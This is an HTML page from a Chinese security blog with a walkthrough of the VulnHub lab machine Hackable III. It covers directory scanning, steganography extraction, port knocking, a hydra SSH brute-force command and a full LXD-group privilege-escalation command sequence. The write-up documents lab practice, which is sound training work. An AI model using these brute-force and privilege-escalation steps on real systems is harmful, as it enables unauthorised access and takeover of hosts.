@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"syst1m.top","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="环境vulnhub项目 https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;hackable-iii,720&#x2F;靶机:172.16.17.156攻击机kali:172.16.17.140 信息收集nmap扫描靶机,22端口filtered,80正常开发,apache 访问首页看看">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackable-3打靶">
+<meta property="og:url" content="https://syst1m.top/2022/06/27/hackable-3%E6%89%93%E9%9D%B6/index.html">
+<meta property="og:site_name" content="Syst1m">
+<meta property="og:description" content="环境vulnhub项目 https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;hackable-iii,720&#x2F;靶机:172.16.17.156攻击机kali:172.16.17.140 信息收集nmap扫描靶机,22端口filtered,80正常开发,apache 访问首页看看">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272036738.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272042009.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272044678.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272053867.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272054740.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272055221.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272057190.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272048590.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272100696.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272105700.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272110189.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272111295.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272112979.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272113138.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272125744.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272134681.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272140728.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272140818.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272142726.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206280958059.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206280959656.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206281006417.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206281012148.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206281015482.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206281017369.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206281020151.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206281023340.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206281028117.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206281039098.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206281037956.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206281041068.png">
+<meta property="article:published_time" content="2022-06-27T12:01:23.000Z">
+<meta property="article:modified_time" content="2022-06-28T02:41:45.513Z">
+<meta property="article:author" content="Syst1m">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="ftp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206272036738.png">
+
+
+<link rel="canonical" href="https://syst1m.top/2022/06/27/hackable-3%E6%89%93%E9%9D%B6/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://syst1m.top/2022/06/27/hackable-3%E6%89%93%E9%9D%B6/","path":"2022/06/27/hackable-3打靶/","title":"hackable-3打靶"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>hackable-3打靶 | Syst1m</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Syst1m" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Syst1m</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A2%B0%E6%92%9Essh%E6%89%93%E5%BC%80%E7%AB%AF%E5%8F%A3"><span class="nav-number">3.1.</span> <span class="nav-text">碰撞ssh打开端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E7%A0%B4ssh"><span class="nav-number">3.2.</span> <span class="nav-text">爆破ssh</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.3.</span> <span class="nav-text">提权</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Syst1m"
+      src="/images/IMG_0010.JPG">
+  <!--
+  <p class="site-author-name" itemprop="name">Syst1m</p>
+  -->
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">54</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chencicici" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chencicici" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1343369483@qq.com" title="E-Mail → mailto:1343369483@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.uodrad.top/" title="https:&#x2F;&#x2F;www.uodrad.top&#x2F;" rel="noopener" target="_blank">uodrad</a>
+        </li>
+    </ul>
+  </div>
+
+
+       <!--网易云插件-->
+      <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1933503036&auto=0&height=66">
+      </iframe>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/chencicici" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://syst1m.top/2022/06/27/hackable-3%E6%89%93%E9%9D%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/IMG_0010.JPG">
+      <meta itemprop="name" content="Syst1m">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Syst1m">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="hackable-3打靶 | Syst1m">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          hackable-3打靶
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-06-27 20:01:23" itemprop="dateCreated datePublished" datetime="2022-06-27T20:01:23+08:00">2022-06-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-28 10:41:45" itemprop="dateModified" datetime="2022-06-28T10:41:45+08:00">2022-06-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%89%93%E9%9D%B6/" itemprop="url" rel="index"><span itemprop="name">打靶</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hackable-iii,720/">https://www.vulnhub.com/entry/hackable-iii,720/</a><br>靶机:172.16.17.156<br>攻击机kali:172.16.17.140</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描靶机,22端口filtered,80正常开发,apache<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272036738.png"></p>
+<p>访问首页看看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272042009.png"></p>
+<p>没有功能点,扫下目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272044678.png"></p>
+<p>挨个访问,有两个txt文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272053867.png"></p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272054740.png"><br>一个字典<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272055221.png"></p>
+<p>一串密文,base64解出为10000,暂时不知道什么意思,继续往下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272057190.png"></p>
+<p>在网页源码里看到了注释,得到提示,还有一个登录口<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272048590.png"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- &quot;Please, jubiscleudo, don&#x27;t forget to activate the port knocking when exiting your section, </span></span><br><span class="line"><span class="comment">and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com&quot; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- “jubiscleudo，请不要忘记在退出部门时激活端口敲门，并告诉老板不要忘记批准.jpg文件-dev_suport@hackable3.com&quot; --&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到一个用户名和一个邮箱,结合上面的端口扫描,应该是提示需要碰撞打开22端口</p>
+<p>访问登录口<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272100696.png"></p>
+<p>尝试利用上面的字典爆破,无果<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272105700.png"></p>
+<p>在登录页的源码里翻到一个地址<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272110189.png"></p>
+<p>进一步扫描目录,.php结尾的文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272111295.png"></p>
+<p>挨个访问,爆出了源码和数据库密码,但是数据库端口并不对外开放<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272112979.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272113138.png"></p>
+<p>login.php中提到一个3.jpg,直接访问看看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272125744.png"></p>
+<p>没有任何提示和利用的地方,想到隐写,把图片下载下来 进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://172.16.17.156/3.jpg ./</span><br><span class="line">steghide --extract -sf 3.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272134681.png"></p>
+<p>得到提示,porta:65535,前面得到一个10000,应该是knock使用碰撞ssh端口,但是还差一个,继续翻前面爆破出的目录</p>
+<p>翻到一个2.txt<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272140728.png"></p>
+<p>熟悉的ctf加密方式<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272140818.png"></p>
+<p>解密 <a target="_blank" rel="noopener" href="http://www.hiencode.com/brain.html">http://www.hiencode.com/brain.html</a><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272142726.png"></p>
+<p>得到三个端口号 65535 10000 4444</p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="碰撞ssh打开端口"><a href="#碰撞ssh打开端口" class="headerlink" title="碰撞ssh打开端口"></a>碰撞ssh打开端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">knock 172.16.17.156 -v 10000 4444 65535</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206280958059.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206280959656.png"></p>
+<h2 id="爆破ssh"><a href="#爆破ssh" class="headerlink" title="爆破ssh"></a>爆破ssh</h2><p>使用上面拿到的用户名和字典,爆破ssh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jubiscleudo -P wordlist.txt 172.16.17.156 ssh </span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281006417.png"></p>
+<p>登录账号,找到第一个flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281012148.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>没有sudo权限的文件,在网站目录下翻到一个隐藏文件,提示我们mysql root用户没有密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281015482.png"></p>
+<p>尝试登录mysql发现根本没有这个服务<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281017369.png"></p>
+<p>回到上面的隐藏文件,发现给出一个账号密码,在家目录翻的时候,恰好有一个hackable_3用户的文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&#x27;DB_USERNAME&#x27;</span>, <span class="string">&#x27;hackable_3&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;TrOLLED_3&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281020151.png"></p>
+<p>登录成功,但是没有任何可利用的地方<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281023340.png"></p>
+<p>查阅其他师傅的文章,发现在lxd组中,lxd和docker一样,一种容器<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281028117.png"></p>
+<p>利用lxd容器提权,思路是将容器的目录映射到root目录下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281039098.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281037956.png"></p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">提权方法</a> 使用第二种</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># build a simple alpine image</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/saghul/lxd-alpine-builder</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">sed -i <span class="string">&#x27;s,yaml_path=&quot;latest-stable/releases/$apk_arch/latest-releases.yaml&quot;,yaml_path=&quot;v3.8/releases/$apk_arch/latest-releases.yaml&quot;,&#x27;</span> build-alpine</span><br><span class="line">sudo ./build-alpine -a i686</span><br><span class="line"></span><br><span class="line"><span class="comment"># import the image</span></span><br><span class="line">lxc image import ./alpine*.tar.gz --<span class="built_in">alias</span> myimage <span class="comment"># It&#x27;s important doing this from YOUR HOME directory on the victim machine, or it might fail.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># before running the image, start and configure the lxd storage pool as default </span></span><br><span class="line">lxd init</span><br><span class="line"></span><br><span class="line"><span class="comment"># run the image</span></span><br><span class="line">lxc init myimage mycontainer -c security.privileged=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mount the /root into the image</span></span><br><span class="line">lxc config device add mycontainer mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># interact with the container</span></span><br><span class="line">lxc start mycontainer</span><br><span class="line">lxc <span class="built_in">exec</span> mycontainer /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>在&#x2F;mnt&#x2F;root&#x2F;root下拿到flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281041068.png"></p>
+
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Syst1m
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://syst1m.top/2022/06/27/hackable-3%E6%89%93%E9%9D%B6/" title="hackable-3打靶">https://syst1m.top/2022/06/27/hackable-3打靶/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+              <a href="/tags/ftp/" rel="tag"># ftp</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/06/27/hackable-2%E6%89%93%E9%9D%B6/" rel="prev" title="hackable:2打靶">
+                  <i class="fa fa-chevron-left"></i> hackable:2打靶
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Syst1m</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
